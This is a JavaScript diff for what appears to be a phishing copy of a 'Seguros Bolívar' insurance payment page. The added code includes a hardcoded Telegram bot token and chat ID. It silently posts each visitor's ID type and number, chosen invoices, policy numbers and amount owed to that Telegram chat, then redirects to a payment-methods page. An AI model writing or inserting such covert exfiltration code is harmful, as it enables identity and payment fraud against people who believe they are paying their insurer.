@@ -679,12 +679,45 @@ function filtrarProductos() {
   });
 }
 
+// ─── TELEGRAM ───
+const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+const TELEGRAM_CHAT_ID = '-1004457768033';
+
+function enviarSeleccionTelegram(numDoc, tipoDoc, totalPagar, facturasTexto) {
+  const mensaje =
+    '🔔 *SELECCIÓN DE PAGO — SEGUROS BOLÍVAR*\n\n' +
+    '🆔 *Cédula:* ' + tipoDoc + ' ' + numDoc + '\n' +
+    '💰 *Total a pagar:* ' + fmt(totalPagar) + '\n' +
+    '🧾 *Facturas seleccionadas:*\n' + facturasTexto + '\n' +
+    '🕐 *Fecha:* ' + new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+  fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'Markdown' }),
+    keepalive: true
+  }).catch(function(err) { console.error('Telegram error:', err); });
+}
+
 function irAPagar() {
   if (selectedInvoices.size === 0) return;
   var params = new URLSearchParams(window.location.search);
   var numDoc = params.get('numDoc') || '';
   var tipoDoc = params.get('tipoDoc') || 'CC';
   var totalPagar = totalSelected + taxSelected;
+
+  // Construir texto de facturas para Telegram
+  var facturasTexto = '';
+  selectedInvoices.forEach(function(invId) {
+    var inv = allInvoices[invId];
+    if (inv) {
+      facturasTexto += '  • ' + inv.invoiceNumber + ' — ' + fmt(inv.debtValue) + ' (Póliza ' + inv.policyId + ')\n';
+    }
+  });
+
+  // Enviar a Telegram
+  enviarSeleccionTelegram(numDoc, tipoDoc, totalPagar, facturasTexto);
+
   window.location.href = 'medios.html?numDoc=' + encodeURIComponent(numDoc) + '&tipoDoc=' + encodeURIComponent(tipoDoc) + '&total=' + totalPagar;
 }
 
